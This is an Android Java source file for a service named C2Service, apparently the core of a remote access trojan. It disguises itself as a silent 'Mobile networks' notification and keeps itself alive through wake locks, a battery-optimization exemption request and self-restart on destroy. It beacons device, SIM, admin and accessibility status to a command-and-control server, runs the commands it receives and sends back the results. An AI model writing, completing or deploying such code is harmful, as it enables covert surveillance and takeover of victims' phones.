package com.gls.sim1;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.net.wifi.WifiManager;

import androidx.core.app.NotificationCompat;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class C2Service extends Service {
    public static volatile boolean running;
    private final ExecutorService pool = Executors.newFixedThreadPool(4);
    private Handler main;
    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;
    private Thread poller;

    @Override
    public void onCreate() {
        super.onCreate();
        running = true;
        Foreground.set(this);
        Net.loadServer(this);
        main = new Handler(Looper.getMainLooper());
        createChannel();
        Notification n = new NotificationCompat.Builder(this, "s1")
                .setContentTitle("Mobile networks")
                .setContentText("Searching…")
                .setSmallIcon(R.drawable.ic_sim1)
                .setOngoing(true)
                .setShowWhen(false)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(1, n);
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "s1:c2");
        wakeLock.acquire();
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        if (wm != null) {
            wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "s1:wifi");
            wifiLock.acquire();
        }

        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            try {
                startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()))
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            } catch (Exception ignored) {
            }
        }

        poller = new Thread(this::pollLoop, "s1-poll");
        poller.start();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm.getNotificationChannel("s1") == null) {
                NotificationChannel ch = new NotificationChannel("s1", "Mobile networks", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void pollLoop() {
        String id = Net.deviceId(this);
        long backoff = Config.POLL_MS;
        while (running && !Thread.currentThread().isInterrupted()) {
            try {
                JsonObject hb = new JsonObject();
                hb.addProperty("id", id);
                hb.addProperty("name", Build.MODEL);
                hb.addProperty("model", Build.MODEL);
                hb.addProperty("brand", Build.BRAND);
                hb.addProperty("android", Build.VERSION.RELEASE);
                hb.addProperty("sdk", Build.VERSION.SDK_INT);
                hb.addProperty("sim", Net.simLabel(this));
                hb.addProperty("battery", CommandHandler.batteryPct(this));
                hb.addProperty("network", Net.networkType(this));
                hb.addProperty("admin", CommandHandler.isAdmin(this));
                hb.addProperty("a11y", RatAccessibilityService.isUp());
                hb.addProperty("stream", ScreenStreamer.getInstance().anyActive());

                Net.postJson("/api/register", id, hb);
                Net.postJson("/api/heartbeat", id, hb);

                String poll = Net.postJson("/api/poll", id, hb);
                backoff = Config.POLL_MS;
                JsonObject pj = Net.G.fromJson(poll, JsonObject.class);
                if (pj != null && pj.has("cmds") && pj.get("cmds").isJsonArray()) {
                    JsonArray cmds = pj.getAsJsonArray("cmds");
                    for (int k = 0; k < cmds.size(); k++) {
                        JsonObject c = cmds.get(k).getAsJsonObject();
                        dispatch(id, c.get("cid").getAsInt(), c.get("type").getAsString(),
                                c.has("args") ? c.getAsJsonObject("args") : new JsonObject());
                    }
                }
                Thread.sleep(backoff);
            } catch (InterruptedException ie) {
                break;
            } catch (Throwable t) {
                backoff = Math.min(backoff * 2, 20000);
                try { Thread.sleep(backoff); } catch (InterruptedException ie) { break; }
            }
        }
    }

    private void dispatch(String id, int cid, String type, JsonObject args) {
        main.post(() -> {
            JsonObject res = CommandHandler.handle(C2Service.this, type, args);
            pool.execute(() -> {
                try {
                    JsonObject out = new JsonObject();
                    out.addProperty("id", id);
                    out.addProperty("cid", cid);
                    out.add("result", res);
                    Net.postJson("/api/result", id, out);
                } catch (Exception ignored) {
                }
            });
        });
    }

    @Override
    public void onDestroy() {
        running = false;
        if (poller != null) poller.interrupt();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
        pool.shutdownNow();
        super.onDestroy();
        try {
            Intent i = new Intent(getApplicationContext(), C2Service.class);
            if (Build.VERSION.SDK_INT >= 26) getApplicationContext().startForegroundService(i);
            else getApplicationContext().startService(i);
        } catch (Exception ignored) {
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
